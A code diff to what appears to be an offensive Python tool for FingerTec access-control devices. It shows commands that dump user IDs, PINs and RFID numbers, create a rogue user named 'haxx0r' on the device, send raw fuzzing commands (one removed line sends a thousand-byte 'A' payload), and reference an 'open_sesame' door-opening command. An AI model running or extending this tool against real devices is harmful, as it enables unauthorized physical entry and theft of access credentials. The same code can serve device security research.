@@ -46,7 +46,7 @@ def send_command(args):
     if args.fuzz:
         data *= args.fuzz
     res = f.send_command(args.command, args.data.encode())
-    print(res)
+    #print(res)
     f.enable_device()
     f.disconnect()
 
@@ -217,7 +217,7 @@ class Fingertec():
 
 
         res = self.send_command(1503, b'\x01\t\x00\x05\x00\x00\x00\x00\x00\x00\x00')
-        print(res)
+        # print(res)
         data_e = [res[i:i+28] for i in range(12, len(res), 28)]
         try:
             print("| ID        | Privilege | PIN   | RFID       | Username |")
@@ -259,7 +259,7 @@ class Fingertec():
         record = record_id + b'\x06' + b_pin + b_name + rfid + (b'\x00'*4)+ record_id + b'\x00\x00'
         
         self.send_command(1500,b'F\x00\x00\x00')  # Init write mode?
-        res = self.send_command(1501, b'A'*1000 )#b':\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + record + b'A'*50)
+        res = self.send_command(1501, b':\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + record )
         self.send_command(110, b'\x0c\x00\x00\x00\x00\x00\x08\x00') # Save changes
 
         sys.stdout.write('User created successfully.\n')
@@ -278,7 +278,7 @@ create_user_parser = subparsers.add_parser('create_user')
 create_user_parser.add_argument('host', help='FingerTec Device IP address')
 create_user_parser.add_argument('--user_id', default='1337', help='User ID to create.  Default is 1337.')
 create_user_parser.add_argument('--user_name', default='haxx0r', help='User name - max of 8 letters.')
-create_user_parser.add_argument('--pin', default='1337', help='PIN - max of 5 characters.  Default 1337.')
+create_user_parser.add_argument('--pin', default='', help='PIN - max of 5 characters.  Default 1337.')
 create_user_parser.add_argument('--rfid', default='0', help='RFID card number.')
 create_user_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")
 
@@ -304,7 +304,7 @@ send_command_parser.add_argument('host', help='FingerTec Device IP address')
 send_command_parser.add_argument('command', help='Command (integer)', type=int)
 send_command_parser.add_argument('data', help='Additional data (args) sent')
 send_command_parser.add_argument('--commkey', default=0, type=int, help="COMM Key")
-# send_command_parser.add_argument('--fuzz', default=0, type=int, help="Fuzz multiplier (for testing)")
+send_command_parser.add_argument('--fuzz', default=0, type=int, help="Fuzz multiplier (for testing)")
 send_command_parser.set_defaults(func=send_command)
 
 open_sesame_parser = subparsers.add_parser('open_sesame')
